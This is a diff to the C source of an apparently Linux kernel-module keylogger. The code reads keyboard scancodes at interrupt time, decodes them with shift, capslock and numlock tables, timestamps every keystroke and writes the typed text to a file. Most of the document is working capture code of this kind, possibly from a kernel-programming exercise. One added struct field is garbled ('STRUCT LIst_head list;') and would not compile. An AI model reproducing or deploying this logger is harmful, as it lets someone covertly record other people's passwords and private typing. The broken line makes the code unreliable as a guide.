@@ -11,25 +11,31 @@
 
 #define COUNT_OF(x) (sizeof(x) / sizeof(*x))
 
+#define NUMLOCK_KEY	0x45
+#define CAPSLOCK_KEY	0x3a
+#define LSHIFT_KEY	0x2A
+#define RSHIFT_KEY	0x36
+
 #define IS_PRESSED(x) (!x)
 #define IS_RELEASED(x) (x)
-#define IS_VALID(x) (x < keytable_len ? keytable[x].name : "!UNKNOWN!")
-#define IS_PRINT_CMD(x) (x == 0x1C || x == 0x0F || x == 0x39)
-#define IS_SHIFT(x) (x == 0x36 || x == 0x2A)
-
-struct stroke_s {
-	unsigned char key;
-	unsigned char state;
-	const char *name;
-	char value;
-	struct tm time;
-	struct list_head list;
-};
+#define IS_SHIFT(x) (x == LSHIFT_KEY || x == RSHIFT_KEY)
+#define IS_CAPSLOCK(x) (x == CAPSLOCK_KEY)
+#define IS_NUMLOCK(x) (x == NUMLOCK_KEY)
+#define KEY_IN_NUMPAD(x) (x >= 0x47 && x <= 0x53)
 
 struct keycode_s {
 	char ascii;
 	const char *name;
-	char command;
+};
+
+struct stroke_s {
+	unsigned char key;
+	unsigned char state;
+	char value;
+	char ascii;
+	const char *name;
+	struct tm time;
+	STRUCT LIst_head list;
 };
 
 static void irq_keylogger(unsigned long data);
@@ -55,67 +61,74 @@ DECLARE_TASKLET(tasklet_s, irq_keylogger, 0);
 DEFINE_RWLOCK(log_lock);
 DEFINE_RWLOCK(misc_lock);
 
-
 const struct keycode_s keytable[] = {
-	{0x0, "Empty", -1}, {0x1, "ESC", 1}, {'1', "1", 0}, {'2', "2", 0},
-	{'3', "3", 0}, {'4', "4", 0}, {'5', "5", 0}, {'6', "6", 0},
-	{'7', "7", 0}, {'8', "8", 0}, {'9', "9", 0}, {'0', "0", 0},
-	{'-', "-", 0}, {'=', "=", 0}, {0xE, "BACKSPACE", 1}, {'\t', "TAB", 1},
-	{'q', "q", 0}, {'w', "w", 0}, {'e', "e", 0}, {'r', "r", 0},
-	{'t', "t", 0}, {'y', "y", 0}, {'u', "u", 0}, {'i', "i", 0},
-	{'o', "o", 0}, {'p', "p", 0}, {'[', "[", 0}, {']', "]", 0},
-	{'\n', "ENTER", 1}, {0x1D, "CONTROL", 1}, {'a', "a", 0}, {'s', "s", 0},
-	{'d', "d", 0}, {'f', "f", 0}, {'g', "g", 0}, {'h', "h", 0},
-	{'j', "j", 0}, {'k', "k", 0}, {'l', "l", 0}, {';', ";", 0},
-	{'\'', "\'", 0}, {'`', "`", 0}, {0x2A, "LEFT SHIFT", 1},
-	{'\\', "\\", 0}, {'z', "z", 0}, {'x', "x", 0}, {'c', "c", 0},
-	{'v', "v", 0}, {'b', "b", 0}, {'n', "n", 0}, {'m', "m", 0},
-	{',', ",", 0}, {'.', ".", 0}, {'/', "/", 0}, {0x36, "RIGHT SHIFT", 1},
-	{0x37, "PRINT", 1}, {0x38, "ALT", 1}, {' ', "SPACE", 1},
-	{0x3A, "CAPSLOCK", 1}, {0x3B, "F1", 1}, {0x3C, "F2", 1},
-	{0x3D, "F3", 1}, {0x3E, "F4", 1}, {0x3F, "F5", 1}, {0x40, "F6", 1},
-	{0x41, "F7", 1}, {0x42, "F8", 1}, {0x43, "F9", 1}, {0x44, "F10", 1},
-	{0x45, "NUMLOCK", 1}, {0x46, "SCREENLOCK", 1}, {0x47, "HOME", 1},
-	{0x48, "ARROW UP", 1}, {0x49, "PAGE UP", 1}, {'-', "(NUM) MINUS", 1},
-	{0x4B, "ARROW LEFT", 1}, {'5', "(NUM) 5", 1}, {0x4D, "ARROW RIGHT", 1},
-	{'+', "(NUM) PLUS", 1}, {0x4F, "END", 1}, {0x50, "ARROW DOWN", 1},
-	{0x51, "PAGE DOWN", 1}, {0x52, "INSERT", 1}, {0x53, "DELETE", 1},
-	{0x0, NULL, 0}
+	{0x0, "Empty"}, {0x0, "ESC"}, {'1', "1"}, {'2', "2"},
+	{'3', "3"}, {'4', "4"}, {'5', "5"}, {'6', "6"},
+	{'7', "7"}, {'8', "8"}, {'9', "9"}, {'0', "0"},
+	{'-', "-"}, {'=', "="}, {0x0, "BACKSPACE"}, {'\t', "TAB"},
+	{'q', "q"}, {'w', "w"}, {'e', "e"}, {'r', "r"},
+	{'t', "t"}, {'y', "y"}, {'u', "u"}, {'i', "i"},
+	{'o', "o"}, {'p', "p"}, {'[', "["}, {']', "]"},
+	{'\n', "ENTER"}, {0x0, "CONTROL"}, {'a', "a"}, {'s', "s"},
+	{'d', "d"}, {'f', "f"}, {'g', "g"}, {'h', "h"},
+	{'j', "j"}, {'k', "k"}, {'l', "l"}, {';', ";"},
+	{'\'', "\'"}, {'`', "`"}, {0x0, "LEFT SHIFT"},
+	{'\\', "\\"}, {'z', "z"}, {'x', "x"}, {'c', "c"},
+	{'v', "v"}, {'b', "b"}, {'n', "n"}, {'m', "m"},
+	{',', ","}, {'.', "."}, {'/', "/"}, {0x0, "RIGHT SHIFT"},
+	{'*', "(NUM) *"}, {0x0, "ALT"}, {' ', "SPACE"},
+	{0x0, "CAPSLOCK"}, {0x0, "F1"}, {0x0, "F2"},
+	{0x0, "F3"}, {0x0, "F4"}, {0x0, "F5"}, {0x0, "F6"},
+	{0x0, "F7"}, {0x0, "F8"}, {0x0, "F9"}, {0x0, "F10"},
+	{0x0, "NUMLOCK"}, {0x0, "SCREENLOCK"}, {0x0, "HOME"},
+	{0x0, "ARROW UP"}, {0x0, "PAGE UP"}, {'-', "(NUM) -"},
+	{0x0, "ARROW LEFT"}, {'5', "(NUM) 5"}, {0x0, "ARROW RIGHT"},
+	{'+', "(NUM) +"}, {0x0, "END"}, {0x0, "ARROW DOWN"},
+	{0x0, "PAGE DOWN"}, {0x0, "INSERT"}, {0x0, "DELETE"},
+	{0x0, NULL}
 };
 
 const struct keycode_s keytable_shift[] = {
-	{0x0, "Empty", -1}, {0x1, "ESC", 1}, {'!', "!", 0}, {'@', "@", 0},
-	{'#', "#", 0}, {'$', "$", 0}, {'%', "%", 0}, {'^', "^", 0},
-	{'&', "&", 0}, {'*', "*", 0}, {'(', "(", 0}, {')', ")", 0},
-	{'_', "_", 0}, {'+', "+", 0}, {0xE, "BACKSPACE", 1}, {'\t', "TAB", 1},
-	{'Q', "Q", 0}, {'W', "W", 0}, {'E', "E", 0}, {'R', "R", 0},
-	{'T', "T", 0}, {'Y', "Y", 0}, {'U', "U", 0}, {'I', "I", 0},
-	{'O', "O", 0}, {'P', "P", 0}, {'{', "{", 0}, {'}', "}", 0},
-	{'\n', "ENTER", 1}, {0x1D, "CONTROL", 1}, {'A', "A", 0}, {'S', "S", 0},
-	{'D', "D", 0}, {'F', "F", 0}, {'G', "G", 0}, {'H', "H", 0},
-	{'J', "J", 0}, {'K', "K", 0}, {'L', "L", 0}, {':', ":", 0},
-	{'\"', "\"", 0}, {'~', "~", 0}, {0x2A, "LEFT SHIFT", 1},
-	{'\\', "\\", 0}, {'Z', "Z", 0}, {'X', "X", 0}, {'C', "C", 0},
-	{'V', "V", 0}, {'B', "B", 0}, {'N', "N", 0}, {'M', "M", 0},
-	{'<', "<", 0}, {'>', ">", 0}, {'?', "?", 0}, {0x36, "RIGHT SHIFT", 1},
-	{0x37, "PRINT", 1}, {0x38, "ALT", 1}, {' ', "SPACE", 1},
-	{0x3A, "CAPSLOCK", 1}, {0x3B, "F1", 1}, {0x3C, "F2", 1},
-	{0x3D, "F3", 1}, {0x3E, "F4", 1}, {0x3F, "F5", 1}, {0x40, "F6", 1},
-	{0x41, "F7", 1}, {0x42, "F8", 1}, {0x43, "F9", 1}, {0x44, "F10", 1},
-	{0x45, "NUMLOCK", 1}, {0x46, "SCREENLOCK", 1}, {0x47, "HOME", 1},
-	{0x48, "ARROW UP", 1}, {0x49, "PAGE UP", 1}, {'-', "(NUM) -", 1},
-	{0x4B, "ARROW LEFT", 1}, {'5', "(NUM) 5", 1}, {0x4D, "ARROW RIGHT", 1},
-	{'+', "(NUM) +", 1}, {0x4F, "END", 1}, {0x50, "ARROW DOWN", 1},
-	{0x51, "PAGE DOWN", 1}, {0x52, "INSERT", 1}, {0x53, "DELETE", 1},
-	{0x0, NULL, 0}
+	{0x0, "Empty"}, {0x0, "ESC"}, {'!', "!"}, {'@', "@"},
+	{'#', "#"}, {'$', "$"}, {'%', "%"}, {'^', "^"},
+	{'&', "&"}, {'*', "*"}, {'(', "("}, {')', ")"},
+	{'_', "_"}, {'+', "+"}, {0x0, "BACKSPACE"}, {'\t', "TAB"},
+	{'Q', "Q"}, {'W', "W"}, {'E', "E"}, {'R', "R"},
+	{'T', "T"}, {'Y', "Y"}, {'U', "U"}, {'I', "I"},
+	{'O', "O"}, {'P', "P"}, {'{', "{"}, {'}', "}"},
+	{'\n', "ENTER"}, {0x0, "CONTROL"}, {'A', "A"}, {'S', "S"},
+	{'D', "D"}, {'F', "F"}, {'G', "G"}, {'H', "H"},
+	{'J', "J"}, {'K', "K"}, {'L', "L"}, {':', ":"},
+	{'\"', "\""}, {'~', "~"}, {0x0, "LEFT SHIFT"},
+	{'\\', "\\"}, {'Z', "Z"}, {'X', "X"}, {'C', "C"},
+	{'V', "V"}, {'B', "B"}, {'N', "N"}, {'M', "M"},
+	{'<', "<"}, {'>', ">"}, {'?', "?"}, {0x0, "RIGHT SHIFT"},
+	{0x0, "PRINT"}, {0x0, "ALT"}, {' ', "SPACE"},
+	{0x0, "CAPSLOCK"}, {0x0, "F1"}, {0x0, "F2"},
+	{0x0, "F3"}, {0x0, "F4"}, {0x0, "F5"}, {0x0, "F6"},
+	{0x0, "F7"}, {0x0, "F8"}, {0x0, "F9"}, {0x0, "F10"},
+	{0x0, "NUMLOCK"}, {0x0, "SCREENLOCK"}, {0x0, "HOME"},
+	{0x0, "ARROW UP"}, {0x0, "PAGE UP"}, {'-', "(NUM) -"},
+	{0x0, "ARROW LEFT"}, {'5', "(NUM) 5"}, {0x0, "ARROW RIGHT"},
+	{'+', "(NUM) +"}, {0x0, "END"}, {0x0, "ARROW DOWN"},
+	{0x0, "PAGE DOWN"}, {0x0, "INSERT"}, {0x0, "DELETE"},
+	{0x0, NULL}
 };
 
-static const unsigned int keytable_len = COUNT_OF(keytable);
+const struct keycode_s keytable_numpad[] = {
+	{'7', "(NUM) 7"}, {'8', "(NUM) 8"}, {'9', "(NUM) 9"},
+	{'-', "(NUM) -"}, {'4', "(NUM) 4"}, {'5', "(NUM) 5"},
+	{'6', "(NUM) 6"}, {'+', "(NUM) +"}, {'1', "(NUM) 1"},
+	{'2', "(NUM) 2"}, {'3', "(NUM) 3"}, {'0', "(NUM) 0"},
+	{'.', "(NUM) ."}
+};
+
+static const unsigned int keytable_len_max = COUNT_OF(keytable);
 
 static int keylogger_show(struct seq_file *seq, void *v)
 {
 	const struct stroke_s *cur;
-	static const char *state_str[] = {
+	static const char * const state_str[] = {
 		"RELEASED", "PRESSED"
 	};
 
@@ -148,7 +161,7 @@ static int my_release(struct inode *inode, struct file *file)
 	return single_release(inode, file);
 }
 
-static void get_time(struct tm *time)
+static void get_stroke_time(struct tm *time)
 {
 	struct timeval tv;
 
@@ -163,27 +176,52 @@ static void get_time(struct tm *time)
 
 static void irq_keylogger(unsigned long data)
 {
+
+	static unsigned char capslock_toggle;
+	static unsigned char shift_toggle;
+	static unsigned char numlock_toggle;
+	/* TO DO : use one uchar and bitmask for toggling */
+
+	struct stroke_s *stroke;
 	int scancode;
 	int state;
-	struct stroke_s *stroke;
 
-	static int shift_toggle;
+	static const struct keycode_s *table_entry;
 
 	scancode = inb(0x60);
 	state = (scancode & 0x80) >> 0x7;
 	scancode &= 0x7F;
 
-	if (IS_SHIFT(scancode)) {
-		shift_toggle = state;
-		return ;
-	}
+	if (scancode >= keytable_len_max)
+		return;
+
+	if (IS_CAPSLOCK(scancode) && IS_PRESSED(state)) {
+		capslock_toggle ^= 1;
+		shift_toggle ^= 1;
+	} else if (IS_SHIFT(scancode)) {
+		shift_toggle = IS_PRESSED(state);
+		if (capslock_toggle)
+			shift_toggle ^= 1;
+	} else if (IS_NUMLOCK(scancode) && IS_PRESSED(state))
+		numlock_toggle ^= 1;
+
+	if (shift_toggle)
+		table_entry = &keytable_shift[scancode];
+	else if (numlock_toggle && KEY_IN_NUMPAD(scancode))
+		table_entry = &keytable_numpad[scancode - 0x47];
+	else
+		table_entry = &keytable[scancode];
+
 	stroke = kmalloc(sizeof(struct stroke_s), GFP_ATOMIC);
 	if (!stroke)
 		return;
+
 	stroke->state = state;
 	stroke->key = scancode;
-	get_time(&stroke->time);
-	stroke->name = IS_VALID(stroke->key);
+	stroke->ascii = table_entry->ascii;
+	stroke->name = table_entry->name;
+	get_stroke_time(&stroke->time);
+
 	list_add_tail(&stroke->list, &strokehead);
 }
 
@@ -248,9 +286,8 @@ static ssize_t write_tmp(void)
 				goto out;
 			i = 0;
 		}
-		if (!cur->state && (!keytable[cur->key].command
-					|| IS_PRINT_CMD(cur->key)))
-			buf[i++] = keytable[cur->key].ascii;
+		if (IS_PRESSED(cur->state) && cur->ascii)
+			buf[i++] = cur->ascii;
 	}
 	ret = file_write(file, buf, i);
 out:
